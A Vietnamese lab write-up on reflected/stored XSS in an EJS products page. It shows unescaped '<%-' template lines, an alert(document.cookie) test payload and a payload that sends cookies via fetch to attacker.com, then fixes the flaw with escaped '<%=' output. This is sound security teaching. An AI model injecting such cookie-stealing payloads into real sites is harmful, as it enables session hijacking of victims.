# A7 – Cross-Site Scripting (XSS)

## Scenario

- Reflected/Stored XSS tại `/products` — search term được render không escape

## Mô tả lỗ hổng

EJS dùng `<%-` (unescaped output) thay vì `<%=` (escaped) khi hiển thị dữ liệu từ user input. Bất kỳ HTML/JS nào trong input sẽ được render thẳng ra trang.

## Khai thác

**Vị trí code (v1):** `views/app/products.ejs`

```ejs
Listing products with <strong>search query: </strong> <%- output.searchTerm %>
<td><%- output.products[i].name %></td>
<td><%- output.products[i].description %></td>
```

**Payload:**
```
<script>alert(document.cookie)</script>
```

Nhập vào ô tìm kiếm products → JS thực thi ngay khi trang render.

**Payload đánh cắp cookie:**
```html
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
```

**Kết quả:** Cookie session bị gửi về server attacker → chiếm tài khoản (session hijacking).

## Tác động (Impact)

- Đánh cắp session cookie → chiếm tài khoản
- Redirect nạn nhân sang trang giả mạo (phishing)
- Thực thi JS tùy ý trong trình duyệt nạn nhân

## Fix (v2)

**Đổi `<%-` thành `<%=` trong EJS:**

```ejs
<%- output.searchTerm %>   →   <%= output.searchTerm %>
<%- output.products[i].name %>   →   <%= output.products[i].name %>
```

`<%=` tự động HTML-encode: `<script>` thành `&lt;script&gt;` → không execute được.

## Kết quả sau fix

- Input `<script>alert(1)</script>` được hiển thị là text thô
- JS không thực thi
